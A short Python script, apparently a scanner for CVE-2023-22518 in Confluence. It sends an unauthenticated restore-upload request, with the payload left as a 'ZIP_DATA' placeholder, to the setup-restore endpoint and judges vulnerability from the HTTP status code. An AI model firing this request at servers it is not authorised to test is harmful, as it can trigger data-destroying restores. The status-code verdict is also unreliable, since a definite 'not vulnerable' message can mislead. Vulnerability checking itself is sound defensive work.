import requests
import argparse
from termcolor import colored

def check_vulnerability(url):
    headers = {
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7',
        'X-Atlassian-Token': 'no-check',
    }

    data = """------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="buildIndex"

false
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="file";filename="test-restore.zip"

ZIP_DATA
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="edit"

Upload and import
------WebKitFormBoundaryT3yekvo0rGaL9QR7--"""

    response = requests.post(f'{url}/json/setup-restore.action?synchronous=true', headers=headers, data=data)
    
    print(colored('Request:', 'blue'))
    print(f'{response.request.method} {response.request.url}')
    print(colored('Headers:', 'blue'))
    for k, v in response.request.headers.items():
        print(f'{k}: {v}')
    print(colored('Body:', 'blue'))
    print(response.request.body)
    
    print(colored('\nResponse:', 'blue'))
    print(colored(f'Status Code: {response.status_code}', 'red' if response.status_code == 405 else 'green'))
    print(colored('Headers:', 'blue'))
    for k, v in response.headers.items():
        print(f'{k}: {v}')
    print(colored('Body:', 'blue'))
    print(response.text)

    if response.status_code == 405:
        print(colored(f'{url} might be vulnerable to CVE-2023-22518', 'red'))
    else:
        print(colored(f'{url} is not vulnerable to CVE-2023-22518', 'green'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Check for CVE-2023-22518 vulnerability')
    parser.add_argument('-i', '--instance-url', required=True, help='URL of the Confluence instance')
    args = parser.parse_args()
    
    check_vulnerability(args.instance_url)
